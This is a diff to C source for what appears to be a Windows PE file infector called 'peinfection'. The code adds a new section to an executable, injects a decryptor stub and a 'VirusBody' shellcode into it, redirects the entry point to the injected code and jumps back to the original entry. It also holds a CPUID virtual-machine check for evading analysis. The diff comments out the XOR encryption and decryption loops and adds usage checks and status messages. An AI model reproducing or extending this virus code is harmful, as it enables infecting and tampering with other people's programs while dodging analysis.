@@ -5,13 +5,14 @@ VOID SHELLCODE()
 {
     __asm__(
         "_Decryptor:"
-        "lea _VirusBody, %esi;"
-        "mov $100, %eax;"
-        "Decryploop:"
-        "xor $0x6, (%esi);"
-        "add $4, %esi;"
-        "sub $4, %eax;"
-        "jnz Decryploop;");
+        "nop;");
+    // "lea _VirusBody, %esi;"
+    // "mov $500, %eax;"
+    // "Decryptloop:"
+    // "xorb $0xff, (%esi);"
+    // "inc %esi;"
+    // "dec %eax;"
+    // "jnz Decryptloop;");
 
     // Check VM: Calling CPUID with eax = 1 and check 31st bit of ecx, vm is 1
     __asm__(
@@ -72,6 +73,12 @@ VOID SHELLCODE()
 
 int main(int argc, char *argv[])
 {
+    if (argc < 2)
+    {
+        printf("Usage: peinfection <path>\n");
+        return 1;
+    }
+
     HANDLE hFile, hFileMapping;
     DWORD dwFileSize, dwFileSizeHight, dwSectionAlignment, dwFileAlignment;
     WORD wNumnberOfSections;
@@ -91,7 +98,7 @@ int main(int argc, char *argv[])
     hFile = CreateFile(pNewFilename, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hFile == INVALID_HANDLE_VALUE)
     {
-        printf("Can't open file");
+        printf("[ERROR] Can't open file");
         return 1;
     }
 
@@ -102,7 +109,7 @@ int main(int argc, char *argv[])
     // Read PE Headers
     if (ParsePEHeader(pMapView, &pe) == 1)
     {
-        printf("[OK] Read headers");
+        printf("[OK] Read headers\n");
     }
 
     // Get number of sections, section alignment, file alignment
@@ -119,6 +126,7 @@ int main(int argc, char *argv[])
 
     // Add Empty section
     DWORD dwNewSectionRawOffset = AddEmptySection(&pe, wNumnberOfSections, dwSectionAlignment, pMapView);
+    printf("[OK] Added new section (0x%02x)\n", dwNewSectionRawOffset);
 
     // Add Shellcode to new section
     extern const char Decryptor[];
@@ -138,15 +146,23 @@ int main(int argc, char *argv[])
     PBYTE pMessageboxShellcode = (PBYTE)malloc(dwMessageboxShellcodeSize * sizeof(BYTE));
     memcpy(pMessageboxShellcode, (PBYTE)VirusBody, dwMessageboxShellcodeSize);
 
+    // Encryptor
+    // for (int i = 0; i < 500; i++)
+    // {
+    //     pMessageboxShellcode[i] ^= 0xff;
+    // }
+
     // Add shellcode to new section
     memcpy(pMapView + dwNewSectionRawOffset, pDecryptorShellcode, dwDecryptorShellcodeSize);
     memcpy(pMapView + dwNewSectionRawOffset + dwDecryptorShellcodeSize, pMessageboxShellcode, dwMessageboxShellcodeSize);
+    printf("[OK] Infected code to new section (%d bytes)\n", dwShellcodeSize);
 
     // Set new address of entryPoint
     PIMAGE_SECTION_HEADER pNewSectionHeader = &pe.pFirstSectionHeader[wNumnberOfSections];
 
     DWORD dwOldEntryPoint = pe.pNTHeaders->OptionalHeader.AddressOfEntryPoint;
     pe.pNTHeaders->OptionalHeader.AddressOfEntryPoint = pNewSectionHeader->VirtualAddress;
+    printf("[OK] Set to new Entry Point: 0x%02x\n", pe.pNTHeaders->OptionalHeader.AddressOfEntryPoint);
 
     // Get and set RA to jump to old entry point
     DWORD dwCurrentOffset = dwOldEntryPoint - (pNewSectionHeader->VirtualAddress + dwShellcodeSize + 5);
@@ -155,7 +171,7 @@ int main(int argc, char *argv[])
     memcpy(pRAToEntryPoint + 1, &dwCurrentOffset, 4);
     memcpy(pMapView + dwNewSectionRawOffset + dwShellcodeSize, pRAToEntryPoint, 5);
 
-    printf("Infected");
+    printf("[OK] Infected\n");
 
     Unmap(&hFileMapping, pMapView);
     CloseHandle(hFile);
